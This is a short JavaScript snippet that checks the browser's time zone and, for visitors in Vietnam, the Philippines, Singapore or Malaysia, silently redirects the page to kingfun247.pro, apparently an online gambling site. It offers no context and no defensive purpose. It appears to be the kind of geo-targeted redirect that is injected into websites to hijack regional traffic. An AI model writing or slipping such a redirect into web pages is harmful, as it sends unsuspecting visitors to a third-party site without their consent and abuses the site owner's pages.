const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
console.log(userTimeZone);

if (
  userTimeZone === "Asia/Ho_Chi_Minh" ||
  userTimeZone === "Asia/Saigon" ||
  userTimeZone === "Asia/Manila" ||
  userTimeZone === "Asia/Singapore" ||
  userTimeZone === "Asia/Kuala_Lumpur" ||
  userTimeZone === "Asia/Kuching"
) {
  window.location.href = "https://kingfun247.pro/?utm=app";
}
